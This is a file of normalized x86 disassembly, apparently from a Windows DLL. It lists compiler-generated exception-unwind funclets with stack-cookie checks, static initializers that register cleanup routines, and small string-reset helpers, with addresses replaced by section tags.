mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x184 ]
xor ecx eax
call sub_10001e8b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10001e8b
mov eax r--data
jmp sub_10042443
sub_1008a280
lea esi [ ebp - 0x498 ]
jmp sub_1006a530
sub_1008a28b
lea esi [ ebp - 0x47c ]
jmp sub_10070ff0
sub_1008a296
lea eax [ ebp - 0x504 ]
jmp sub_1001f5f0
sub_1008a2a1
lea ecx [ ebp - 0x458 ]
jmp sub_10019100
sub_1008a2ac
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x508 ]
xor ecx eax
call sub_10001e8b
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10001e8b
mov eax r--data
jmp sub_10042443
sub_1008a2e0
lea esi [ ebp - 0x3e0 ]
jmp sub_1005e150
sub_1008a2eb
lea esi [ ebp - 0x3f0 ]
jmp sub_1006a530
sub_1008a2f6
lea ecx [ ebp - 0x34c ]
jmp sub_10019100
sub_1008a301
lea eax [ ebp - 0x3c8 ]
jmp sub_1001f5f0
sub_1008a30c
lea ecx [ ebp - 0x330 ]
jmp sub_10019100
sub_1008a317
lea esi [ ebp - 0x370 ]
jmp sub_10070ff0
sub_1008a322
lea ecx [ ebp - 0x370 ]
jmp sub_10019100
sub_1008a32d
lea ecx [ ebp - 0x330 ]
jmp sub_10019100
sub_1008a338
lea ecx [ ebp - 0x34c ]
jmp sub_10019100
sub_1008a343
lea ecx [ ebp - 0x370 ]
jmp sub_10019100
sub_1008a34e
lea ecx [ ebp - 0x370 ]
jmp sub_10019100
sub_1008a359
lea ecx [ ebp - 0x34c ]
jmp sub_10019100
sub_1008a364
lea ecx [ ebp - 0x330 ]
jmp sub_10019100
sub_1008a36f
lea ecx [ ebp - 0x370 ]
jmp sub_10019100
sub_1008a37a
lea ecx [ ebp - 0x34c ]
jmp sub_10019100
sub_1008a385
lea ecx [ ebp - 0x330 ]
jmp sub_10019100
sub_1008a390
lea ecx [ ebp - 0x370 ]
jmp sub_10019100
sub_1008a39b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x404 ]
mov ecx [ edx - 0x408 ]
xor ecx eax
call sub_10001e8b
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10001e8b
mov eax r--data
jmp sub_10042443
sub_1008a3d0
lea esi [ ebp - 0x3e0 ]
jmp sub_1006a530
sub_1008a3db
lea esi [ ebp - 0x370 ]
jmp sub_10070ff0
sub_1008a3e6
lea eax [ ebp - 0x3c8 ]
jmp sub_1001f5f0
sub_1008a3f1
lea ecx [ ebp - 0x34c ]
jmp sub_10019100
sub_1008a3fc
lea ecx [ ebp - 0x34c ]
jmp sub_10019100
sub_1008a407
lea ecx [ ebp - 0x370 ]
jmp sub_10019100
sub_1008a412
lea ecx [ ebp - 0x34c ]
jmp sub_10019100
sub_1008a41d
lea ecx [ ebp - 0x330 ]
jmp sub_10019100
sub_1008a428
lea ecx [ ebp - 0x370 ]
jmp sub_10019100
sub_1008a433
lea ecx [ ebp - 0x370 ]
jmp sub_10019100
sub_1008a43e
lea ecx [ ebp - 0x330 ]
jmp sub_10019100
sub_1008a449
lea ecx [ ebp - 0x34c ]
jmp sub_10019100
sub_1008a454
lea ecx [ ebp - 0x370 ]
jmp sub_10019100
sub_1008a45f
lea ecx [ ebp - 0x330 ]
jmp sub_10019100
sub_1008a46a
lea ecx [ ebp - 0x34c ]
jmp sub_10019100
sub_1008a475
lea ecx [ ebp - 0x370 ]
jmp sub_10019100
sub_1008a480
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x3f4 ]
mov ecx [ edx - 0x3f8 ]
xor ecx eax
call sub_10001e8b
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10001e8b
mov eax r--data
jmp sub_10042443
sub_1008a4b0
lea esi [ ebp - 0x3f0 ]
jmp sub_1006a530
sub_1008a4bb
lea eax [ ebp - 0x3d8 ]
jmp sub_1001f5f0
sub_1008a4c6
lea ecx [ ebp - 0x37c ]
jmp sub_10019100
sub_1008a4d1
lea ecx [ ebp - 0x37c ]
jmp sub_10019100
sub_1008a4dc
lea ecx [ ebp - 0x360 ]
jmp sub_10019100
sub_1008a4e7
lea ecx [ ebp - 0x37c ]
jmp sub_10019100
sub_1008a4f2
lea ecx [ ebp - 0x360 ]
jmp sub_10019100
sub_1008a4fd
lea ecx [ ebp - 0x37c ]
jmp sub_10019100
sub_1008a508
lea ecx [ ebp - 0x344 ]
jmp sub_10019100
sub_1008a513
lea ecx [ ebp - 0x360 ]
jmp sub_10019100
sub_1008a51e
lea ecx [ ebp - 0x344 ]
jmp sub_10019100
sub_1008a529
lea ecx [ ebp - 0x37c ]
jmp sub_10019100
sub_1008a534
lea ecx [ ebp - 0x360 ]
jmp sub_10019100
sub_1008a53f
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x3fc ]
mov ecx [ edx - 0x400 ]
xor ecx eax
call sub_10001e8b
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10001e8b
mov eax r--data
jmp sub_10042443
sub_1008a570
lea ecx [ ebp - 0x60 ]
jmp sub_10019100
sub_1008a578
lea edi [ ebp - 0x68 ]
jmp sub_1004cac0
sub_1008a580
lea edi [ ebp - 0x68 ]
jmp sub_1004cac0
sub_1008a588
lea edi [ ebp - 0x68 ]
jmp sub_1004cac0
sub_1008a590
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_10001e8b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10001e8b
mov eax r--data
jmp sub_10042443
sub_1008a5c0
lea esi [ ebp - 0x570 ]
jmp sub_1001deb0
sub_1008a5cb
lea ecx [ ebp - 0x58c ]
jmp sub_1004c8c0
sub_1008a5d6
lea ecx [ ebp - 0x514 ]
jmp sub_1004c8c0
sub_1008a5e1
lea ecx [ ebp - 0x530 ]
jmp sub_1004c8c0
sub_1008a5ec
lea ecx [ ebp - 0x4f8 ]
jmp sub_1004c8c0
sub_1008a5f7
lea ecx [ ebp - 0x530 ]
jmp sub_10019100
sub_1008a602
mov eax [ ebp - 0x594 ]
push eax
call sub_100187af
pop ecx
retn
sub_1008a610
lea ecx [ ebp - 0x530 ]
jmp sub_1004c8c0
sub_1008a61b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x594 ]
mov ecx [ edx - 0x598 ]
xor ecx eax
call sub_10001e8b
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10001e8b
mov eax r--data
jmp sub_10042443
sub_1008a650
mov ecx rw-data
jmp sub_10019100
sub_1008a65a
mov ecx rw-data
jmp sub_10019100
sub_1008a664
mov ecx rw-data
jmp sub_10019100
sub_1008a66e
mov ecx rw-data
jmp sub_10019100
sub_1008a678
mov ecx rw-data
jmp sub_10019100
sub_1008a682
mov esi rw-data
jmp sub_100315f0
sub_1008a68c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10001e8b
mov eax r--data
jmp sub_10042443
sub_1008a6b0
call sub_10058f90
push sub_1008ad10
call sub_100592b3
pop ecx
retn
sub_1008aa10
mov [ rw-data ] 0x0
retn
sub_1008aa20
push sub_1008af50
call sub_100592b3
pop ecx
retn
sub_1008aa30
push 0x0
push r--data
mov ecx rw-data
call sub_10037e00
push sub_1008ad40
call sub_100592b3
pop ecx
retn
sub_1008aa50
push 0x0
push r--data
mov ecx rw-data
call sub_10037e00
push sub_1008ad70
call sub_100592b3
pop ecx
retn
sub_1008aa70
push 0x0
push r--data
mov ecx rw-data
call sub_10037e00
push sub_1008ada0
call sub_100592b3
pop ecx
retn
sub_1008ac89
push sub_1008afb7
call sub_100592b3
pop ecx
retn
sub_1008ac95
push sub_1008afc2
call sub_100592b3
pop ecx
retn
sub_1008aca1
push sub_1008afcd
call sub_100592b3
pop ecx
retn
sub_1008acad
push sub_1008afe2
call sub_100592b3
pop ecx
retn
sub_1008acb9
push sub_1008afd8
call sub_100592b3
pop ecx
retn
sub_1008acc5
mov ecx rw-data
call sub_10053c0a
push sub_1008afec
call sub_100592b3
pop ecx
retn
sub_1008acdb
mov ecx rw-data
call sub_10053c0a
push sub_1008b01e
call sub_100592b3
pop ecx
retn
sub_1008acf1
push sub_1008b028
call sub_100592b3
pop ecx
retn
sub_1008ad00
push r-xdata
call sub_100592b3
pop ecx
retn
sub_1008ad10
mov ecx rw-data
jmp sub_10044a50
j_sub_1000a7a0
jmp sub_1000a7a0
sub_1008ad30
retn
sub_1008ad40
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_100187af
add esp 0x4
sub_1008ad70
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_100187af
add esp 0x4
sub_1008ada0
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_100187af
add esp 0x4
sub_1008afa3
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_10071ca2
sub_1008afb7
mov [ rw-data ] r--data
retn
sub_1008afc2
mov [ rw-data ] r--data
retn
sub_1008afcd
mov [ rw-data ] r--data
retn
sub_1008afd8
mov ecx rw-data
jmp sub_10034a80
sub_1008afe2
mov ecx rw-data
jmp sub_1002faf1
sub_1008afec
mov ecx rw-data
jmp sub_1006c7bc
sub_1008aff6
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_10071ca2
sub_1008b00a
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_10071ca2
sub_1008b01e
mov ecx rw-data
jmp sub_1006c7bc
sub_1008b028
mov ecx rw-data
jmp sub_10022c52
